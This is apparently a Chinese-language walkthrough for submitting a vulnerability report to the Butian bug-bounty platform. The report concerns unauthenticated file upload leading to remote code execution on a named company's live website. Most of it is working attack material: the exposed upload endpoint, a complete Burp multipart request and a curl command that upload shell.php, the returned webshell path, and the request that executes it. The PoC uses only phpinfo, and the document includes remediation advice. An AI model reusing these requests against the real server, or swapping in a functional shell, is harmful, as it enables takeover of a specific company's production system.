# 补天手把手提交指南 — biobasebaby RCE

> 按这个文档一步步做就行，和之前禾赛 O365 那套流程一样。

---

## 第一步：登录补天，点「提交漏洞」

打开 https://www.butian.net → 登录 → 点右上角 **提交漏洞**

---

## 第二步：表单每个格子填什么

直接复制粘贴，不用自己改：

| 补天表单字段 | 填这个 |
|-------------|--------|
| **漏洞标题** | `www.biobasebaby.com 未授权任意文件上传导致远程代码执行` |
| **漏洞类型** | 选 `WEB漏洞` → `文件上传`（没有就选 `代码执行`） |
| **危害等级** | 选 **高危** |
| **厂商名称** | `山东博科保育科技股份有限公司` |
| **漏洞域名** | `www.biobasebaby.com` |
| **漏洞URL** | `https://www.biobasebaby.com/index.php/attachment/upload/upload/dir/images/module/formguide.html` |
| **所属行业** | 制造业 / 医疗器械（按实际选） |
| **是否需要登录** | **否** |

---

## 第三步：漏洞描述（复制到「漏洞描述」框）

```
山东博科保育科技股份有限公司官网 www.biobasebaby.com 使用 YznCMS v1.0.0 搭建。

网站前台留言模块页面泄露了文件上传接口地址，该接口无需任何登录认证，攻击者可直接上传 .php 后缀文件。上传成功后服务器返回 webshell 路径，浏览器访问该路径即可执行 PHP 代码，造成远程代码执行。

本人使用 phpinfo() 验证，上传后访问返回路径，页面完整输出 PHP 7.4.33 运行环境信息，证明代码已被执行。攻击者可进一步读取数据库配置、网站源码和用户数据，存在服务器被接管风险。
```

---

## 第四步：复现步骤（复制到「复现步骤」框）

```
【环境】Windows/Mac 任意，Chrome 浏览器或 Burp Suite，无需登录。

【步骤1】确认上传接口来源（可选）
浏览器打开：
https://www.biobasebaby.com/index.php/formguide/index/index.html?id=5
按 F12 → 查看源代码 → 搜索 image_upload_url
可看到上传地址明文写在 JS 里：
/index.php/attachment/upload/upload/dir/images/module/formguide.html

【步骤2】新建测试文件
本地新建 shell.php，内容一行：
<?php phpinfo(); ?>

【步骤3】上传文件（二选一）

方法A - 用 Burp：
打开 Burp → Proxy 抓包 → 把下面请求发到 Repeater → Send

POST /index.php/attachment/upload/upload/dir/images/module/formguide.html HTTP/1.1
Host: www.biobasebaby.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundary--

方法B - 用命令行：
curl -sk -X POST "https://www.biobasebaby.com/index.php/attachment/upload/upload/dir/images/module/formguide.html" -F "file=@shell.php"

【步骤4】看返回结果
服务器返回 JSON，示例：
{"code":0,"success":1,"state":"SUCCESS","url":"/uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php"}
记下 url 字段的值。

【步骤5】验证代码执行
浏览器打开（把 url 拼到域名后面）：
https://www.biobasebaby.com/uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php

【步骤6】确认漏洞
页面显示完整 phpinfo，标题 PHP Version 7.4.33，漏洞复现成功。
```

---

## 第五步：漏洞危害（复制到「危害」框）

```
1. 远程代码执行：无需登录即可上传并执行 PHP 代码
2. 服务器接管：可读取配置、数据库密码，植入后门
3. 数据泄露：可获取用户留言、会员信息等业务数据
4. 网站篡改：可修改或删除官网页面
```

---

## 第六步：修复建议（复制到「修复建议」框）

```
1. 上传接口增加登录鉴权
2. 禁止上传 .php .phtml .php5 等可执行后缀，白名单仅允许图片
3. uploads 目录禁止 PHP 解析
4. 前台 JS 不要明文暴露上传接口地址
5. 升级 YznCMS 到最新版
```

---

## 第七步：截图怎么做（和之前 O365 一样打包 zip）

需要 **2 张图**，打完 zip 上传：

### 截图1：上传成功（Burp 或 curl 二选一）

**用 Burp 的话：**
1. 打开 Burp → Repeater
2. 粘贴下面请求 → 点 Send
3. 截右半边 Response，要能看到 JSON 里 `code:0` 和 `url` 带 `.php`

**用 curl 的话：**
1. 打开终端，执行：
   ```
   curl -sk -X POST "https://www.biobasebaby.com/index.php/attachment/upload/upload/dir/images/module/formguide.html" -F "file=@shell.php"
   ```
2. 截终端输出，要能看到 `"success":1` 和 `.php` 路径

保存为：`01_upload_success.png`

### 截图2：phpinfo 执行成功

1. 浏览器打开（用你上传返回的 url，每次 hash 不同）：
   ```
   https://www.biobasebaby.com/uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php
   ```
2. 截整个浏览器窗口，要能看到 **PHP Version 7.4.33** 和 phpinfo 表格

保存为：`02_phpinfo_rce.png`

### 打包

```
zip biobase_rce_poc.zip 01_upload_success.png 02_phpinfo_rce.png
```

补天附件上传这个 zip。

---

## 第八步：提交前检查

- [ ] 等级选的是 **高危**（别选成中危）
- [ ] 类型是 **文件上传** 或 **代码执行**
- [ ] 写了「无需登录」
- [ ] 附了 2 张截图 zip
- [ ] PoC 只用了 phpinfo，没写 system/exec
- [ ] URL 带 `.html` 后缀（写错路径审核复现不了）

---

## 备用：完整 Burp 请求包（直接复制）

```
POST /index.php/attachment/upload/upload/dir/images/module/formguide.html HTTP/1.1
Host: www.biobasebaby.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/octet-stream

<?php phpinfo(); ?>
------WebKitFormBoundary--
```

验证请求：
```
GET /uploads/images/20260711/48101bbdd897877cc62b8704a293a436.php HTTP/1.1
Host: www.biobasebaby.com
```

---

## 本地文件

- `shell.php` — 测试用文件，内容 `<?php phpinfo(); ?>`
- 报告目录：`/workspace/biobase-recon/deep13/`
